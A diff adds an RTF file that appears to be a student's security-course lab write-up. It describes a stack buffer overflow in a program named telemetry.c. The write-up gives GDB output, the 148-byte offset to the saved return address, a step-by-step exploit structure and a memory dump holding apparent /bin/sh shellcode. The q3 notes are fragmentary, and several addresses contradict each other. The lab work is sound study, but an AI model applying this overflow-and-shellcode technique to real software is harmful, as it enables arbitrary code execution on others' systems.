@@ -1,0 +1,122 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2577
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\froman\fcharset0 Times-Roman;\f1\fnil\fcharset0 Menlo-Regular;\f2\fnil\fcharset0 Menlo-Bold;
+}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red0\green0\blue0;\red0\green0\blue255;
+\red251\green0\blue7;\red180\green36\blue25;}
+{\*\expandedcolortbl;;\csgray\c0;\cssrgb\c0\c0\c0;\cssrgb\c0\c0\c100000;
+\cssrgb\c100000\c0\c0;\cssrgb\c76409\c21698\c12524;}
+\margl1440\margr1440\vieww39720\viewh12740\viewkind0
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx4602\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\f0\fs36 \cf2 q2:\
+Main Idea:\
+The line 17 only checks the file if empty and does not check the file size which lets an attacker write past the end of the msg. \cf3 \expnd0\expndtw0\kerning0
+We insert shellcode above the saved return address on the stack (rip) and overwrite the rip with the address of shellcode. \cf2 \kerning1\expnd0\expndtw0 \
+\
+Magic Number:\
+First we get msg buffer (\CocoaLigature0 0xbffffc08) and the address of the rip of the display function (0xbffffc9c).\cf3 \expnd0\expndtw0\kerning0
+\CocoaLigature1 This was done by invoking GDB and setting a breakpoint at line 21.\
+\cf2 \kerning1\expnd0\expndtw0 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\f1 \CocoaLigature0 (gdb) x/16x msg\
+0xbffffa58:	0x61616161	0x61616161 0x61616161 0x61616161\
+0xbffffa68:	0x61616161	0x61616161 0x61616161 0x61616161\
+0xbffffa78:	0x61616161	0x61616161 0x61616161 0x61616161\
+0xbffffa88:	0x61616161	0x61616161 0x61616161 0x61616161
+\f0 \CocoaLigature1 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx4602\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\f1 \CocoaLigature0 (gdb) i f\
+Stack level 0, frame at 0xbffffaf0:\
+ eip = 0x400721 in display (telemetry.c:21); saved eip = 0xbffffca0\
+ called by frame at 0x61616169\
+ source language c.\
+ Arglist at 0xbffffae8, args: path=0xcd58326a <error: Cannot access memory at address 0xcd58326a>\
+ Locals at 0xbffffae8, Previous frame's sp is 0xbffffaf0\
+ Saved registers:\
+  ebx at 0xbffffae4, ebp at 0xbffffae8, eip at 0xbffffaec
+\f0 \CocoaLigature1 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx4602\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx4602\tx5040\tx5600\tx6160\tx6720\pardeftab720\sa240\partightenfactor0
+\cf3 \expnd0\expndtw0\kerning0
+By doing so, we learned that the location of the return address from this function was \
+148 bytes away from the start of the buffer (
+\f1 \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 0xbffffaec
+\f0 \cf4 \expnd0\expndtw0\kerning0
+\CocoaLigature1  \cf3 - 
+\f1 \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 0xbffffa58
+\f0 \cf5 \expnd0\expndtw0\kerning0
+\CocoaLigature1  \cf3 = 0x94 = 148). \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx4602\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf2 \kerning1\expnd0\expndtw0 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx4602\tx5040\tx5600\tx6160\tx6720\pardeftab720\sa240\partightenfactor0
+\cf3 \expnd0\expndtw0\kerning0
+Exploit Structure:\
+1. write the first byte which is the size of the file and write 148 dummy characters to overwrite buf, the compiler padding, and the sfp. \
+2.Overwrite the rip with the address of shellcode. Since we are putting shellcode directly after the rip, we overwrite the rip with 
+\f1 \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 0xbffffaf0
+\f0  (
+\f1 0xbffffaec
+\f0  + 4)\
+3. \cf3 \expnd0\expndtw0\kerning0
+\CocoaLigature1 Finally, insert the shellcode directly after the rip. \
+This causes the display function to start executing the shellcode at address \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 0xbffffca0\cf3 \expnd0\expndtw0\kerning0
+\CocoaLigature1  when it returns. \
+Exploit GDB Output \
+When we ran GDB after inputting the malicious exploit string, we got the following output: \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\f1 \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 0xbffffa58:	0x61616161	0x61616161 0x61616161 0x61616161\
+0xbffffa68:	0x61616161	0x61616161 0x61616161 0x61616161\
+0xbffffa78:	0x61616161	0x61616161 0x61616161 0x61616161\
+0xbffffa88:	0x61616161	0x61616161 0x61616161 0x61616161\
+0xbffffa98:	0x61616161	0x61616161 0x61616161 0x61616161\
+0xbffffaa8:	0x61616161	0x61616161 0x61616161 0x61616161\
+0xbffffab8:	0x61616161	0x61616161 0x61616161 0x61616161\
+0xbffffac8:	0x61616161	0x61616161 0x61616161 0x61616161\
+0xbffffad8:	0x000000c0	0x61616161 0x61616161 0x61616161\
+0xbffffae8:	0x61616161	0xbffffaf0 0xcd58326a 0x89c38980\
+0xbffffaf8:	0x58476ac1	0xc03180cd 0x2f2f6850 0x2f686873\
+0xbffffb08:	0x546e6962	0x8953505b 0xb0d231e1 0x0a80cd0b
+\f0 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx4602\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf3 \expnd0\expndtw0\kerning0
+\CocoaLigature1 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx4602\tx5040\tx5600\tx6160\tx6720\pardeftab720\sa240\partightenfactor0
+\cf3 After 148 bytes of garbage , the rip is overwritten with \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 0xbffffca0\cf3 \expnd0\expndtw0\kerning0
+\CocoaLigature1 , which points to the shellcode directly after the rip.\
+q3: \
+b 33\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\f1 \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 (gdb) x/16x c.answer\
+0xbffffaf4:     0x61616161      0x62626261      0x5c616262      0x0d84bdb9\
+0xbffffb04:     0x401fb003      0x62626200      0x5c616262      0x0000785c\
+0xbffffb14:     0x030d84bd      0x00401fb0      0xbffffb28      0x00400839\
+0xbffffb24:     0xb7ffcf5c      0xbffffbac      0xb7f8cc8b      0x00000001
+\f0 \cf3 \expnd0\expndtw0\kerning0
+\CocoaLigature1 \
+
+\f1 \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 \
+\
+\
+\
+i f   ebx at 0xbffffb18, ebp at 0xbffffb1c, eip at 0xbffffb20\
+\
+\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\f2\b \cf6 \\x24\\xfb\\xff\\xbf
+\f1\b0 \cf2 \
+\
+\
+\
+\
+\
+\
+\
+}
